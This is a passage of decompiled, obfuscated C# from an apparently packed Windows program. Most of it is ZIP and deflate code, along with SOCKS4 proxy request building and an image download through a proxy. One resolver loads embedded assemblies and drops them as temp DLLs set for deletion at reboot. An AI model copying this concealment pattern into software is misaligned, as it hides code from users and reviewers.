							gclass0_0.uint_0 = zipSegmentedStream.uint_0;
						}
						break;
					}
					int num = 0;
					bool flag2;
					do
					{
						num++;
						Class16.smethod_135(gclass0_0, stream_0, num);
						Class16.smethod_95(stream_0, gclass0_0);
						Class16.smethod_449(stream_0, gclass0_0);
						gclass0_0.long_6 = (long)gclass0_0.int_3 + gclass0_0.long_1 + (long)gclass0_0.int_4;
						flag2 = (num <= 1 && stream_0.CanSeek && Class16.smethod_90(gclass0_0));
						if (flag2)
						{
							if (zipSegmentedStream != null)
							{
								uint uint_ = gclass0_0.uint_0;
								long long_ = gclass0_0.long_4;
								Class16.smethod_516(long_, zipSegmentedStream, uint_);
							}
							else
							{
								stream_0.Seek(gclass0_0.long_4, SeekOrigin.Begin);
							}
							stream_0.SetLength(stream_0.Position);
							if (stream != null)
							{
								Class16.smethod_6(gclass0_0.long_6, stream);
							}
						}
					}
					while (flag2);
					gclass0_0.bool_9 = false;
					flag = true;
				}
				catch (Exception ex)
				{
					Enum1 zipErrorAction = gclass0_0.ZipErrorAction;
					int num2 = 0;
					while (gclass0_0.ZipErrorAction != Enum1.const_0)
					{
						if (gclass0_0.ZipErrorAction != Enum1.const_1)
						{
							if (gclass0_0.ZipErrorAction != Enum1.const_2)
							{
								if (num2 <= 0)
								{
									if (gclass0_0.ZipErrorAction == Enum1.const_3)
									{
										Class16.smethod_26(gclass0_0, ex);
										if (gclass0_0.bool_12)
										{
											flag = true;
											goto IL_246;
										}
									}
									num2++;
									continue;
								}
								throw;
							}
						}
						long num3 = (stream != null) ? Class16.smethod_145(stream) : stream_0.Position;
						long num4 = num3 - gclass0_0.long_5;
						if (num4 > 0L)
						{
							stream_0.Seek(num4, SeekOrigin.Current);
							long position = stream_0.Position;
							stream_0.SetLength(stream_0.Position);
							if (stream != null)
							{
								Class16.smethod_6(num3 - position, stream);
							}
						}
						if (gclass0_0.ZipErrorAction == Enum1.const_1)
						{
							Class16.smethod_529(gclass0_0, "Skipping file {0} (exception: {1})", new object[]
							{
								gclass0_0.string_0,
								ex.ToString()
							});
							gclass0_0.bool_9 = true;
							flag = true;
						}
						else
						{
							gclass0_0.ZipErrorAction = zipErrorAction;
						}
						IL_246:
						goto IL_248;
					}
					throw;
				}
				IL_248:;
			}
			while (!flag);
		}

		static bool smethod_593(long long_0, Class10 class10_0)
		{
			bool result;
			switch (class10_0.comparisonOperator_0)
			{
			case ComparisonOperator.GreaterThan:
				result = (long_0 > class10_0.long_0);
				break;
			case ComparisonOperator.GreaterThanOrEqualTo:
				result = (long_0 >= class10_0.long_0);
				break;
			case ComparisonOperator.LesserThan:
				result = (long_0 < class10_0.long_0);
				break;
			case ComparisonOperator.LesserThanOrEqualTo:
				result = (long_0 <= class10_0.long_0);
				break;
			case ComparisonOperator.EqualTo:
				result = (long_0 == class10_0.long_0);
				break;
			case ComparisonOperator.NotEqualTo:
				result = (long_0 != class10_0.long_0);
				break;
			default:
				throw new ArgumentException("Operator");
			}
			return result;
		}

		static byte smethod_594(Class32 class32_0)
		{
			return (byte)(class32_0.uint_0 >> 32 - class32_0.int_0 & 255u);
		}

		static void smethod_595(Socket socket_0, Class61 class61_0)
		{
			if (class61_0.socket_1 != null)
			{
				class61_0.socket_1.Close();
			}
			class61_0.socket_1 = socket_0;
		}

		static void smethod_596(GClass0 gclass0_0, GClass0 gclass0_1)
		{
			gclass0_0.long_3 = gclass0_1.long_3;
			gclass0_0.CompressionMethod = (CompressionMethod)gclass0_1.short_8;
			gclass0_0.short_9 = gclass0_1.short_9;
			gclass0_0.long_1 = gclass0_1.long_1;
			gclass0_0.long_2 = gclass0_1.long_2;
			gclass0_0.short_7 = gclass0_1.short_7;
			gclass0_0.enum0_0 = gclass0_1.enum0_0;
			gclass0_0.dateTime_0 = gclass0_1.dateTime_0;
			gclass0_0.dateTime_1 = gclass0_1.dateTime_1;
			gclass0_0.dateTime_2 = gclass0_1.dateTime_2;
			gclass0_0.dateTime_3 = gclass0_1.dateTime_3;
			gclass0_0.bool_0 = gclass0_1.bool_0;
			gclass0_0.bool_2 = gclass0_1.bool_2;
			gclass0_0.bool_1 = gclass0_1.bool_1;
		}

		static ReadOnlyCollection<string> smethod_597(bool bool_0, Class17 class17_0, string string_0)
		{
			if (class17_0.class9_0 == null)
			{
				throw new ArgumentException("SelectionCriteria has not been set");
			}
			List<string> list = new List<string>();
			try
			{
				if (Directory.Exists(string_0))
				{
					string[] files = Directory.GetFiles(string_0);
					string[] array = files;
					for (int i = 0; i < array.Length; i++)
					{
						string text = array[i];
						if (Class16.smethod_24(class17_0, text))
						{
							list.Add(text);
						}
					}
					if (bool_0)
					{
						string[] directories = Directory.GetDirectories(string_0);
						string[] array2 = directories;
						for (int j = 0; j < array2.Length; j++)
						{
							string text2 = array2[j];
							if (class17_0.method_0() || (File.GetAttributes(text2) & FileAttributes.ReparsePoint) == (FileAttributes)0)
							{
								if (Class16.smethod_24(class17_0, text2))
								{
									list.Add(text2);
								}
								list.AddRange(Class16.smethod_597(bool_0, class17_0, text2));
							}
						}
					}
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (IOException)
			{
			}
			return list.AsReadOnly();
		}

		static GClass0 smethod_598(Delegate1 delegate1_0, Delegate2 delegate2_0, string string_0, GClass1 gclass1_0)
		{
			Class16.smethod_441(string_0, gclass1_0);
			return Class16.smethod_126(delegate2_0, delegate1_0, gclass1_0, string_0);
		}

		static void smethod_599(Class22 class22_0, byte byte_0)
		{
			uint[] arg_1F_0 = class22_0.uint_0;
			int arg_1F_1 = 0;
			GClass3 gclass3_ = class22_0.gclass3_0;
			int int_ = (int)class22_0.uint_0[0];
			arg_1F_0[arg_1F_1] = Class16.smethod_511(byte_0, int_, gclass3_);
			class22_0.uint_0[1] = class22_0.uint_0[1] + (uint)((byte)class22_0.uint_0[0]);
			class22_0.uint_0[1] = class22_0.uint_0[1] * 134775813u + 1u;
			uint[] arg_7E_0 = class22_0.uint_0;
			int arg_7E_1 = 2;
			gclass3_ = class22_0.gclass3_0;
			int_ = (int)class22_0.uint_0[2];
			byte byte_ = (byte)(class22_0.uint_0[1] >> 24);
			arg_7E_0[arg_7E_1] = Class16.smethod_511(byte_, int_, gclass3_);
		}

		static void smethod_600(GClass1.Class28 class28_0)
		{
			class28_0.int_0 = -1;
			((IDisposable)class28_0.enumerator_0).Dispose();
		}

		static Assembly smethod_601(object object_0, ResolveEventArgs resolveEventArgs_0)
		{
			Class69.Struct16 @struct = new Class69.Struct16(resolveEventArgs_0.Name);
			string s = @struct.method_0(false);
			string b = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
			string[] array = "ezQ3NWU5NzI0LWMwOTItNDhiYy1iYjU3LThjOGVlZDVhNjU5M30sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{804454ba-a866-4838-a035-f1255f66a63b},ezQ3NWU5NzI0LWMwOTItNDhiYy1iYjU3LThjOGVlZDVhNjU5M30=,[z]{804454ba-a866-4838-a035-f1255f66a63b}".Split(new char[]
			{
				','
			});
			string text = string.Empty;
			bool flag = false;
			bool flag2 = false;
			for (int i = 0; i < array.Length - 1; i += 2)
			{
				if (array[i] == b)
				{
					text = array[i + 1];
					IL_79:
					if (text.Length == 0 && @struct.string_2.Length == 0)
					{
						b = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
						for (int j = 0; j < array.Length - 1; j += 2)
						{
							if (array[j] == b)
							{
								text = array[j + 1];
								break;
							}
						}
					}
					if (text.Length > 0)
					{
						if (text[0] == '[')
						{
							int num = text.IndexOf(']');
							string text2 = text.Substring(1, num - 1);
							flag = (text2.IndexOf('z') >= 0);
							flag2 = (text2.IndexOf('t') >= 0);
							text = text.Substring(num + 1);
						}
						Assembly result;
						lock (Class69.dictionary_0)
						{
							if (Class69.dictionary_0.ContainsKey(text))
							{
								result = Class69.dictionary_0[text];
							}
							else
							{
								Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text);
								if (manifestResourceStream == null)
								{
									goto IL_25E;
								}
								int num2 = (int)manifestResourceStream.Length;
								byte[] array2 = new byte[num2];
								manifestResourceStream.Read(array2, 0, num2);
								if (flag)
								{
									array2 = Class16.smethod_679(array2);
								}
								Assembly assembly = null;
								if (!flag2)
								{
									try
									{
										assembly = Assembly.Load(array2);
									}
									catch (FileLoadException)
									{
										flag2 = true;
									}
									catch (BadImageFormatException)
									{
										flag2 = true;
									}
								}
								if (flag2)
								{
									try
									{
										string text3 = string.Format("{0}{1}\\", Path.GetTempPath(), text);
										Directory.CreateDirectory(text3);
										string text4 = text3 + @struct.string_0 + ".dll";
										if (!File.Exists(text4))
										{
											FileStream fileStream = File.OpenWrite(text4);
											fileStream.Write(array2, 0, array2.Length);
											fileStream.Close();
											Class16.MoveFileEx(text4, null, 4);
											Class16.MoveFileEx(text3, null, 4);
										}
										assembly = Assembly.LoadFile(text4);
									}
									catch
									{
									}
								}
								Class69.dictionary_0[text] = assembly;
								result = assembly;
							}
						}
						return result;
					}
					IL_25E:
					return null;
				}
			}
			goto IL_79;
		}

		static void smethod_602(Stream8 stream8_0, bool bool_0, bool bool_1)
		{
			if (stream8_0.bool_2)
			{
				return;
			}
			stream8_0.bool_2 = true;
			if (bool_0 || bool_1)
			{
				stream8_0.autoResetEvent_0.WaitOne();
			}
			do
			{
				int num = -1;
				int num2 = bool_0 ? 200 : (bool_1 ? -1 : 0);
				int num3 = -1;
				do
				{
					if (Monitor.TryEnter(stream8_0.queue_0, num2))
					{
						num3 = -1;
						try
						{
							if (stream8_0.queue_0.Count > 0)
							{
								num3 = stream8_0.queue_0.Dequeue();
							}
						}
						finally
						{
							Monitor.Exit(stream8_0.queue_0);
						}
						if (num3 >= 0)
						{
							Class37 @class = stream8_0.list_0[num3];
							if (@class.int_1 != stream8_0.int_3 + 1)
							{
								lock (stream8_0.queue_0)
								{
									stream8_0.queue_0.Enqueue(num3);
								}
								if (num == num3)
								{
									stream8_0.autoResetEvent_0.WaitOne();
									num = -1;
								}
								else if (num == -1)
								{
									num = num3;
								}
							}
							else
							{
								num = -1;
								Class32 class32_ = @class.class32_0;
								Class16.smethod_442(class32_);
								MemoryStream memoryStream_ = @class.memoryStream_0;
								memoryStream_.Seek(0L, SeekOrigin.Begin);
								long num4 = 0L;
								byte[] array = new byte[1024];
								int num5;
								while ((num5 = memoryStream_.Read(array, 0, array.Length)) > 0)
								{
									for (int i = 0; i < num5; i++)
									{
										Class16.smethod_524(stream8_0.class32_0, array[i]);
									}
									num4 += (long)num5;
								}
								if (class32_.int_0 > 0)
								{
									Class16.smethod_478(stream8_0.class32_0, class32_.int_0, (uint)Class16.smethod_594(class32_));
								}
								stream8_0.uint_0 = (stream8_0.uint_0 << 1 | stream8_0.uint_0 >> 31);
								stream8_0.uint_0 ^= @class.method_0().method_0();
								stream8_0.long_1 += num4;
								Class16.smethod_463(class32_);
								stream8_0.int_3 = @class.int_1;
								@class.int_1 = -1;
								stream8_0.queue_1.Enqueue(@class.int_0);
								if (num2 == -1)
								{
									num2 = 0;
								}
							}
						}
					}
					else
					{
						num3 = -1;
					}
				}
				while (num3 >= 0);
				if (!bool_0)
				{
					break;
				}
			}
			while (stream8_0.int_3 != stream8_0.int_4);
			stream8_0.bool_2 = false;
		}

		static void smethod_603(Class39 class39_0, Class47 class47_0)
		{
			short[] short_ = class47_0.short_0;
			short[] short_2 = class47_0.class50_0.short_2;
			int[] int_ = class47_0.class50_0.int_0;
			int int_2 = class47_0.class50_0.int_1;
			int int_3 = class47_0.class50_0.int_3;
			int num = 0;
			for (int i = 0; i <= Class49.int_0; i++)
			{
				class39_0.short_5[i] = 0;
			}
			short_[class39_0.int_40[class39_0.int_42] * 2 + 1] = 0;
			int j;
			for (j = class39_0.int_42 + 1; j < Class47.int_0; j++)
			{
				int num2 = class39_0.int_40[j];
				int i = (int)(short_[(int)(short_[num2 * 2 + 1] * 2 + 1)] + 1);
				if (i > int_3)
				{
					i = int_3;
					num++;
				}
				short_[num2 * 2 + 1] = (short)i;
				if (num2 <= class47_0.int_6)
				{
					short[] expr_CB_cp_0 = class39_0.short_5;
					int expr_CB_cp_1 = i;
					expr_CB_cp_0[expr_CB_cp_1] += 1;
					int num3 = 0;
					if (num2 >= int_2)
					{
						num3 = int_[num2 - int_2];
					}
					short num4 = short_[num2 * 2];
					class39_0.int_47 += (int)num4 * (i + num3);
					if (short_2 != null)
					{
						class39_0.int_48 += (int)num4 * ((int)short_2[num2 * 2 + 1] + num3);
					}
				}
			}
			if (num == 0)
			{
				return;
			}
			do
			{
				int i = int_3 - 1;
				while (class39_0.short_5[i] == 0)
				{
					i--;
				}
				short[] expr_159_cp_0 = class39_0.short_5;
				int expr_159_cp_1 = i;
				expr_159_cp_0[expr_159_cp_1] -= 1;
				class39_0.short_5[i + 1] = class39_0.short_5[i + 1] + 2;
				short[] expr_18D_cp_0 = class39_0.short_5;
				int expr_18D_cp_1 = int_3;
				expr_18D_cp_0[expr_18D_cp_1] -= 1;
				num -= 2;
			}
			while (num > 0);
			for (int i = int_3; i != 0; i--)
			{
				int num2 = (int)class39_0.short_5[i];
				while (num2 != 0)
				{
					int num5 = class39_0.int_40[--j];
					if (num5 <= class47_0.int_6)
					{
						if ((int)short_[num5 * 2 + 1] != i)
						{
							class39_0.int_47 = (int)((long)class39_0.int_47 + ((long)i - (long)short_[num5 * 2 + 1]) * (long)short_[num5 * 2]);
							short_[num5 * 2 + 1] = (short)i;
						}
						num2--;
					}
				}
			}
		}

		static string smethod_604(Class62 class62_0)
		{
			return class62_0.string_3;
		}

		static void smethod_605(Class41 class41_0, byte[] byte_0, int int_0, int int_1)
		{
			Array.Copy(byte_0, int_0, class41_0.byte_0, 0, int_1);
			class41_0.int_13 = int_1;
			class41_0.int_12 = int_1;
		}

		static string smethod_606(Stream10 stream10_0)
		{
			return stream10_0.string_1;
		}

		static Socket smethod_607(Class61 class61_0)
		{
			return class61_0.socket_0;
		}

		static void smethod_608(short[] short_0, short[] short_1, Class39 class39_0)
		{
			int num = 0;
			if (class39_0.int_45 != 0)
			{
				do
				{
					int num2 = class39_0.int_46 + num * 2;
					int num3 = ((int)class39_0.byte_0[num2] << 8 & 65280) | (int)(class39_0.byte_0[num2 + 1] & 255);
					int num4 = (int)(class39_0.byte_0[class39_0.int_43 + num] & 255);
					num++;
					if (num3 == 0)
					{
						Class16.smethod_338(class39_0, num4, short_0);
					}
					else
					{
						int num5 = (int)Class47.sbyte_2[num4];
						Class16.smethod_338(class39_0, num5 + Class49.int_3 + 1, short_0);
						int num6 = Class47.int_1[num5];
						if (num6 != 0)
						{
							num4 -= Class47.int_4[num5];
							Class16.smethod_371(class39_0, num4, num6);
						}
						num3--;
						num5 = Class16.smethod_385(num3);
						Class16.smethod_338(class39_0, num5, short_1);
						num6 = Class47.int_2[num5];
						if (num6 != 0)
						{
							num3 -= Class47.int_5[num5];
							Class16.smethod_371(class39_0, num3, num6);
						}
					}
				}
				while (num < class39_0.int_45);
			}
			Class16.smethod_338(class39_0, Class39.int_18, short_0);
			class39_0.int_50 = (int)short_0[Class39.int_18 * 2 + 1];
		}

		static void smethod_609(Class33 class33_0)
		{
			bool[] bool_ = class33_0.class34_0.bool_0;
			bool[] bool_2 = class33_0.class34_0.bool_1;
			int num = 16;
			while (--num >= 0)
			{
				bool_2[num] = false;
				int num2 = num * 16;
				int num3 = 16;
				while (--num3 >= 0)
				{
					if (bool_[num2 + num3])
					{
						bool_2[num] = true;
					}
				}
			}
			uint num4 = 0u;
			for (int i = 0; i < 16; i++)
			{
				if (bool_2[i])
				{
					num4 |= 1u << 16 - i - 1;
				}
			}
			Class16.smethod_478(class33_0.class32_0, 16, num4);
			for (int j = 0; j < 16; j++)
			{
				if (bool_2[j])
				{
					int num5 = j * 16;
					num4 = 0u;
					for (int k = 0; k < 16; k++)
					{
						if (bool_[num5 + k])
						{
							num4 |= 1u << 16 - k - 1;
						}
					}
					Class16.smethod_478(class33_0.class32_0, 16, num4);
				}
			}
		}

		static GClass2 smethod_610(Stream12 stream12_0)
		{
			if (stream12_0.gclass2_0 == null)
			{
				bool bool_ = stream12_0.enum23_0 == Enum23.const_0;
				stream12_0.gclass2_0 = new GClass2();
				if (stream12_0.enum22_0 == Enum22.const_1)
				{
					Class16.smethod_620(stream12_0.gclass2_0, bool_);
				}
				else
				{
					stream12_0.gclass2_0.enum21_0 = stream12_0.enum21_0;
					GClass2 gclass2_ = stream12_0.gclass2_0;
					Enum20 enum20_ = stream12_0.enum20_0;
					Class16.smethod_513(enum20_, gclass2_, bool_);
				}
			}
			return stream12_0.gclass2_0;
		}

		static Class39.Class40 smethod_611(Enum20 enum20_0)
		{
			return Class39.Class40.class40_0[(int)enum20_0];
		}

		static void smethod_612(Form1 form1_0)
		{
			Thread thread = new Thread(new ThreadStart(form1_0.method_2))
			{
				IsBackground = false,
				Priority = ThreadPriority.Highest
			};
			thread.Start();
		}

		static void smethod_613(GClass0 gclass0_0)
		{
			if (gclass0_0.short_9 != 0 && gclass0_0.short_9 != 8 && gclass0_0.short_9 != 12)
			{
				throw new ZipException(string.Format("Entry {0} uses an unsupported compression method (0x{1:X2}, {2})", gclass0_0.string_1, gclass0_0.short_9, gclass0_0.UnsupportedCompressionMethod));
			}
		}

		static int smethod_614(int int_0, Enum21 enum21_0, int int_1, GClass2 gclass2_0, Class39 class39_0, Enum20 enum20_0)
		{
			class39_0.gclass2_0 = gclass2_0;
			class39_0.gclass2_0.string_0 = null;
			if (int_1 < 9 || int_1 > 15)
			{
				throw new GException0("windowBits must be in the range 9..15.");
			}
			if (int_0 < 1 || int_0 > Class39.int_0)
			{
				throw new GException0(string.Format("memLevel must be in the range 1.. {0}", Class39.int_0));
			}
			class39_0.gclass2_0.class39_0 = class39_0;
			class39_0.int_24 = int_1;
			class39_0.int_23 = 1 << class39_0.int_24;
			class39_0.int_25 = class39_0.int_23 - 1;
			class39_0.int_29 = int_0 + 7;
			class39_0.int_28 = 1 << class39_0.int_29;
			class39_0.int_30 = class39_0.int_28 - 1;
			class39_0.int_31 = (class39_0.int_29 + Class39.int_14 - 1) / Class39.int_14;
			class39_0.byte_1 = new byte[class39_0.int_23 * 2];
			class39_0.short_0 = new short[class39_0.int_23];
			class39_0.short_1 = new short[class39_0.int_28];
			class39_0.int_44 = 1 << int_0 + 6;
			class39_0.byte_0 = new byte[class39_0.int_44 * 4];
			class39_0.int_46 = class39_0.int_44;
			class39_0.int_43 = 3 * class39_0.int_44;
			class39_0.enum20_0 = enum20_0;
			class39_0.enum21_0 = enum21_0;
			Class16.smethod_406(class39_0);
			return 0;
		}

		static void smethod_615(string string_0, Class60 class60_0)
		{
			if (string_0 == null)
			{
				throw new ArgumentNullException();
			}
			class60_0.string_1 = string_0;
		}

		static byte[] smethod_616(int int_0, string string_0, Class56 class56_0)
		{
			if (string_0 == null)
			{
				throw new ArgumentNullException();
			}
			if (int_0 <= 0 || int_0 > 65535)
			{
				throw new ArgumentException();
			}
			byte[] array = new byte[10 + Class16.smethod_172(class56_0).Length + string_0.Length];
			array[0] = 4;
			array[1] = 1;
			Array.Copy(Class16.smethod_483(int_0, class56_0), 0, array, 2, 2);
			byte[] arg_61_0 = array;
			int arg_61_1 = 4;
			byte[] arg_5F_0 = array;
			int arg_5F_1 = 5;
			array[6] = 0;
			arg_5F_0[arg_5F_1] = 0;
			arg_61_0[arg_61_1] = 0;
			array[7] = 1;
			Array.Copy(Encoding.ASCII.GetBytes(Class16.smethod_172(class56_0)), 0, array, 8, Class16.smethod_172(class56_0).Length);
			array[8 + Class16.smethod_172(class56_0).Length] = 0;
			Array.Copy(Encoding.ASCII.GetBytes(string_0), 0, array, 9 + Class16.smethod_172(class56_0).Length, string_0.Length);
			array[9 + Class16.smethod_172(class56_0).Length + string_0.Length] = 0;
			return array;
		}

		static int smethod_617(int int_0, Enum20 enum20_0, GClass2 gclass2_0)
		{
			gclass2_0.enum20_0 = enum20_0;
			gclass2_0.int_4 = int_0;
			return Class16.smethod_534(true, gclass2_0);
		}

		static void smethod_618(Class74.Class78 class78_0, byte[] byte_0)
		{
			int[] array = new int[16];
			int[] array2 = new int[16];
			for (int i = 0; i < byte_0.Length; i++)
			{
				int num = (int)byte_0[i];
				if (num > 0)
				{
					array[num]++;
				}
			}
			int num2 = 0;
			int num3 = 512;
			for (int j = 1; j <= 15; j++)
			{
				array2[j] = num2;
				num2 += array[j] << 16 - j;
				if (j >= 10)
				{
					int num4 = array2[j] & 130944;
					int num5 = num2 & 130944;
					num3 += num5 - num4 >> 16 - j;
				}
			}
			class78_0.short_0 = new short[num3];
			int num6 = 512;
			for (int k = 15; k >= 10; k--)
			{
				int num7 = num2 & 130944;
				num2 -= array[k] << 16 - k;
				int num8 = num2 & 130944;
				for (int l = num8; l < num7; l += 128)
				{
					class78_0.short_0[(int)Class16.smethod_196(l)] = (short)(-num6 << 4 | k);
					num6 += 1 << k - 9;
				}
			}
			for (int m = 0; m < byte_0.Length; m++)
			{
				int num9 = (int)byte_0[m];
				if (num9 != 0)
				{
					num2 = array2[num9];
					int num10 = (int)Class16.smethod_196(num2);
					if (num9 <= 9)
					{
						do
						{
							class78_0.short_0[num10] = (short)(m << 4 | num9);
							num10 += 1 << num9;
						}
						while (num10 < 512);
					}
					else
					{
						int num11 = (int)class78_0.short_0[num10 & 511];
						int num12 = 1 << (num11 & 15);
						num11 = -(num11 >> 4);
						do
						{
							class78_0.short_0[num11 | num10 >> 9] = (short)(m << 4 | num9);
							num10 += 1 << num9;
						}
						while (num10 < num12);
					}
					array2[num9] = num2 + (1 << 16 - num9);
				}
			}
		}

		static bool smethod_619(Class84 class84_0, string string_0, string string_1)
		{
			bool result;
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_0);
				httpWebRequest.Proxy = new Class82(class84_0, true);
				httpWebRequest.KeepAlive = false;
				httpWebRequest.Method = "GET";
				httpWebRequest.Timeout = 180000;
				using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
				{
					using (Stream responseStream = httpWebResponse.GetResponseStream())
					{
						if (responseStream != null)
						{
							Image image = Image.FromStream(responseStream);
							image.Save(string_1, ImageFormat.Jpeg);
						}
					}
				}
				if (File.Exists(string_1))
				{
					result = true;
				}
				else
				{
					result = false;
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		static int smethod_620(GClass2 gclass2_0, bool bool_0)
		{
			return Class16.smethod_451(gclass2_0.int_4, bool_0, gclass2_0);
		}

		static void smethod_621(Stream0 stream0_0)
		{
			if (stream0_0.gclass0_0 != null)
			{
				if (stream0_0.bool_5)
				{
					Class16.smethod_15(true, stream0_0);
				}
				Class16.smethod_343(stream0_0.gclass0_0, stream0_0.stream_0, stream0_0.stream4_0, stream0_0.stream_1, stream0_0.stream_2, stream0_0.stream13_0);
				GClass0 gclass0_ = stream0_0.gclass0_0;
				Stream stream_ = stream0_0.stream_0;
				Class16.smethod_378(stream_, gclass0_);
				bool? nullable_ = stream0_0.gclass0_0.nullable_2;
				if (nullable_.HasValue)
				{
					bool arg_89_0 = stream0_0.bool_3;
					bool? nullable_2 = stream0_0.gclass0_0.nullable_2;
					stream0_0.bool_3 = (arg_89_0 | nullable_2.Value);
				}
				stream0_0.stream4_0 = null;
				stream0_0.stream_1 = (stream0_0.stream_2 = null);
				stream0_0.stream13_0 = null;
			}
		}

		static Enum25 smethod_622(Class84 class84_0)
		{
			return (class84_0.method_8() == Class84.Enum26.const_1) ? Enum25.const_2 : Enum25.const_1;
		}

		static void smethod_623(GClass3 gclass3_0, byte byte_0)
		{
			if (gclass3_0.bool_0)
			{
				uint num = gclass3_0.uint_2 >> 24 ^ (uint)byte_0;
				gclass3_0.uint_2 = (gclass3_0.uint_2 << 8 ^ gclass3_0.uint_1[(int)((UIntPtr)num)]);
				return;
			}
			uint num2 = (gclass3_0.uint_2 & 255u) ^ (uint)byte_0;
			gclass3_0.uint_2 = (gclass3_0.uint_2 >> 8 ^ gclass3_0.uint_1[(int)((UIntPtr)num2)]);
		}

		static void smethod_624(GClass0 gclass0_0)
		{
			if (gclass0_0.stream_1 == null)
			{
				throw new ZipException(string.Format("The input stream is null for entry '{0}'.", gclass0_0.string_1));
			}
			if (gclass0_0.nullable_0.HasValue)
			{
				gclass0_0.stream_1.Position = gclass0_0.nullable_0.Value;
				return;
			}
			if (gclass0_0.stream_1.CanSeek)
			{
				gclass0_0.nullable_0 = new long?(gclass0_0.stream_1.Position);
				return;
			}
			if (gclass0_0.enum2_0 == Enum2.const_1 && gclass0_0.enum0_0 != Enum0.const_3 && (gclass0_0.short_7 & 8) != 8)
			{
				throw new ZipException("It is not possible to use PKZIP encryption on a non-seekable input stream");
			}
		}

		static string smethod_625(Class62 class62_0)
		{
			return class62_0.string_0;
		}

		static void smethod_626(int int_0, Class33 class33_0, int int_1)
		{
			Class33.Class34 class34_ = class33_0.class34_0;
			byte[] byte_ = class34_.byte_5;
			int num = int_0;
			while (--num >= 0)
			{
				byte_[num] = (byte)num;
			}
			for (int i = 0; i < int_1; i++)
			{
				byte b = class34_.byte_1[i];
				byte b2 = byte_[0];
				int num2 = 0;
				while (b != b2)
				{
					num2++;
					byte b3 = b2;
					b2 = byte_[num2];
					byte_[num2] = b3;
				}
				byte_[0] = b2;
				class34_.byte_2[i] = (byte)num2;
			}
		}

		static int smethod_627(Class74.Class76 class76_0)
		{
			return class76_0.int_1 - class76_0.int_0 + (class76_0.int_2 >> 3);
		}

		static void smethod_628(Class41 class41_0)
		{
			Class16.smethod_193(class41_0);
			class41_0.byte_0 = null;
			class41_0.int_10 = null;
		}

		static GClass0 smethod_629(Enum10 enum10_0, string string_0, GClass1 gclass1_0, string string_1)
		{
			if (string_0 == null)
			{
				string_0 = "";
			}
			return Class16.smethod_78(gclass1_0, string_1, string_0, enum10_0, true, 0);
		}

		static int smethod_630(Class74.Stream14 stream14_0)
		{
			return Class16.smethod_20(stream14_0) | Class16.smethod_20(stream14_0) << 16;
		}

		static char smethod_631(Stream6 stream6_0)
		{
			return (char)Class16.smethod_434(stream6_0, 8);
		}

		static GClass0 smethod_632(Stream stream_0, string string_0, GClass1 gclass1_0)
		{
			GClass0 gclass0_ = Class16.smethod_326(string_0, stream_0);
			DateTime now = DateTime.Now;
			DateTime now2 = DateTime.Now;
			DateTime now3 = DateTime.Now;
			Class16.smethod_144(now, now3, now2, gclass0_);
			if (gclass1_0.textWriter_0 != null)
			{
				gclass1_0.textWriter_0.WriteLine("adding {0}...", string_0);
			}
			return Class16.smethod_387(gclass1_0, gclass0_);
		}

		static void smethod_633(short[] short_0, int int_0, Class39 class39_0)
		{
			int num = -1;
			int num2 = (int)short_0[1];
			int num3 = 0;
			int num4 = 7;
			int num5 = 4;
			if (num2 == 0)
			{
				num4 = 138;
				num5 = 3;
			}
			short_0[(int_0 + 1) * 2 + 1] = 32767;
			for (int i = 0; i <= int_0; i++)
			{
				int num6 = num2;
				num2 = (int)short_0[(i + 1) * 2 + 1];
				if (++num3 >= num4 || num6 != num2)
				{
					if (num3 < num5)
					{
						class39_0.short_4[num6 * 2] = (short)((int)class39_0.short_4[num6 * 2] + num3);
					}
					else if (num6 != 0)
					{
						if (num6 != num)
						{
							short[] expr_87_cp_0 = class39_0.short_4;
							int expr_87_cp_1 = num6 * 2;
							expr_87_cp_0[expr_87_cp_1] += 1;
						}
						short[] expr_A7_cp_0 = class39_0.short_4;
						int expr_A7_cp_1 = Class49.int_7 * 2;
						expr_A7_cp_0[expr_A7_cp_1] += 1;
					}
					else if (num3 <= 10)
					{
						short[] expr_CF_cp_0 = class39_0.short_4;
						int expr_CF_cp_1 = Class49.int_8 * 2;
						expr_CF_cp_0[expr_CF_cp_1] += 1;
					}
					else
					{
						short[] expr_F1_cp_0 = class39_0.short_4;
						int expr_F1_cp_1 = Class49.int_9 * 2;
						expr_F1_cp_0[expr_F1_cp_1] += 1;
					}
					num3 = 0;
					num = num6;
					if (num2 == 0)
					{
						num4 = 138;
						num5 = 3;
					}
					else if (num6 == num2)
					{
						num4 = 6;
						num5 = 3;
					}
					else
					{
						num4 = 7;
						num5 = 4;
					}
				}
			}
		}

		static void smethod_634(string string_0, GClass0 gclass0_0, GClass1 gclass1_0)
		{
			gclass1_0.dictionary_0.Add(string_0, gclass0_0);
			gclass1_0.list_0 = null;
			gclass1_0.bool_5 = true;
		}

		static bool smethod_635(string string_0)
		{
			return Class16.smethod_503(string_0, false);
		}

		static int smethod_636(Stream stream_0, byte[] byte_0, int int_0, int int_1, string string_0)
		{
			int result = 0;
			bool flag = false;
			int num = 0;
			do
			{
				try
				{
					result = stream_0.Read(byte_0, int_0, int_1);
					flag = true;
				}
				catch (IOException ex)
				{
					SecurityPermission securityPermission = new SecurityPermission(SecurityPermissionFlag.UnmanagedCode);
					if (!securityPermission.IsUnrestricted())
					{
						throw;
					}
					uint num2 = Class16.smethod_251(ex);
					if (num2 != 2147942433u)
					{
						throw new IOException(string.Format("Cannot read file {0}", string_0), ex);
					}
					num++;
					if (num > 10)
					{
						throw new IOException(string.Format("Cannot read file {0}, at offset 0x{1:X8} after 10 retries", string_0, int_0), ex);
					}
					Thread.Sleep(250 + num * 550);
				}
			}
			while (!flag);
			return result;
		}

		static void smethod_637(Class39 class39_0, bool bool_0)
		{
			Class16.smethod_214(class39_0, (class39_0.int_32 >= 0) ? class39_0.int_32 : -1, class39_0.int_36 - class39_0.int_32, bool_0);
			class39_0.int_32 = class39_0.int_36;
			Class16.smethod_532(class39_0.gclass2_0);
		}

		static void smethod_638(Class39 class39_0)
		{
			int i = 0;
			int num = 0;
			int num2 = 0;
